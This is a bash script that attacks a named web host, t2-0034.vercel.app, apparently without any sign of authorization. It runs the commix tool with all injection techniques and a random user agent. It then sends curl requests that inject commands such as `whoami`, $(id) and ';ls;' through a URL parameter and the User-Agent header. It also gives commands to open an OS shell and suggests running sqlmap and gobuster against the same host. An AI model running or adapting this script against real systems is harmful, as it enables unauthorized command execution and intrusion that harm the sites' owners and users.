#!/bin/bash
# Quick execution script for commix attack on t2-0034.vercel.app
# Run this in Kali Linux: bash run_commix_t2_0034.sh

clear
echo "╔════════════════════════════════════════════════════════════╗"
echo "║         COMMIX COMMAND INJECTION EXPLOITATION              ║"
echo "║         Target: https://t2-0034.vercel.app/                ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Check if commix is installed
if ! command -v commix &> /dev/null; then
    echo "[!] Commix not found. Installing..."
    sudo apt update && sudo apt install -y commix
fi

echo "[*] Starting comprehensive exploitation scan..."
echo "[*] This will take 5-15 minutes depending on site complexity"
echo ""
echo "[*] Press Ctrl+C to stop at any time"
echo ""
sleep 2

# Create results directory
mkdir -p t2_0034_results
cd t2_0034_results

# Run the ultimate commix command
echo "[*] Executing commix with maximum detection capabilities..."
echo ""

commix \
  --url="https://t2-0034.vercel.app/" \
  --all \
  --crawl=3 \
  --level=3 \
  --technique=CBTF \
  --os=unix \
  --random-agent \
  --batch \
  --verbose \
  --output-dir=./scan_output 2>&1 | tee commix_full_log.txt

echo ""
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                    SCAN COMPLETE                           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Analyze results
if grep -qi "vulnerable" commix_full_log.txt; then
    echo "[!!!] ═══════════════════════════════════════════════════"
    echo "[!!!] VULNERABILITY DETECTED!"
    echo "[!!!] ═══════════════════════════════════════════════════"
    echo ""
    echo "[*] Vulnerable endpoints:"
    grep -i "vulnerable" commix_full_log.txt | head -10
    echo ""
    echo "[*] You can now exploit this manually or use commix interactive mode"
    echo ""
    echo "[*] To get a shell, run:"
    echo "    commix --url='VULNERABLE_URL_HERE' --os-shell"
    echo ""
elif grep -qi "injection point" commix_full_log.txt; then
    echo "[+] Potential injection points found!"
    grep -i "injection" commix_full_log.txt | head -10
else
    echo "[*] No obvious command injection vulnerabilities detected"
    echo ""
    echo "[*] This could mean:"
    echo "    1. The application is properly secured against command injection"
    echo "    2. Injection points exist but require manual testing"
    echo "    3. The application uses different vulnerability types (SQLi, XSS, etc.)"
    echo ""
    echo "[*] Recommendations:"
    echo "    - Try manual testing with curl"
    echo "    - Use Burp Suite to intercept and modify requests"
    echo "    - Test for SQL injection with sqlmap"
    echo "    - Test for XSS vulnerabilities"
    echo "    - Check for authentication bypass"
fi

echo ""
echo "[*] Full log saved to: $(pwd)/commix_full_log.txt"
echo "[*] Scan results in: $(pwd)/scan_output/"
echo ""

# Try some quick manual tests
echo "╔════════════════════════════════════════════════════════════╗"
echo "║              RUNNING QUICK MANUAL TESTS                    ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

echo "[*] Testing common injection points..."
echo ""

# Test 1: Basic GET parameter
echo "[1] Testing: /?cmd=\`whoami\`"
curl -s "https://t2-0034.vercel.app/?cmd=\`whoami\`" | head -20
echo ""

# Test 2: API endpoint
echo "[2] Testing: /api/test?param=\$(id)"
curl -s "https://t2-0034.vercel.app/api/test?param=\$(id)" | head -20
echo ""

# Test 3: User-Agent header
echo "[3] Testing: User-Agent injection"
curl -s "https://t2-0034.vercel.app/" -H "User-Agent: \`whoami\`" | head -20
echo ""

# Test 4: Check for error messages
echo "[4] Testing: Error disclosure"
curl -s "https://t2-0034.vercel.app/?test=';ls;'" | head -20
echo ""

echo "╔════════════════════════════════════════════════════════════╗"
echo "║                    NEXT STEPS                              ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "1. Review the log file: cat commix_full_log.txt"
echo "2. Check scan results: ls -la scan_output/"
echo "3. If vulnerability found, get interactive shell:"
echo "   commix --url='VULNERABLE_URL' --os-shell"
echo "4. Try other attack vectors:"
echo "   - SQL Injection: sqlmap -u 'https://t2-0034.vercel.app/'"
echo "   - XSS Testing: manual browser testing"
echo "   - Directory bruteforce: gobuster dir -u https://t2-0034.vercel.app/"
echo ""

cd ..
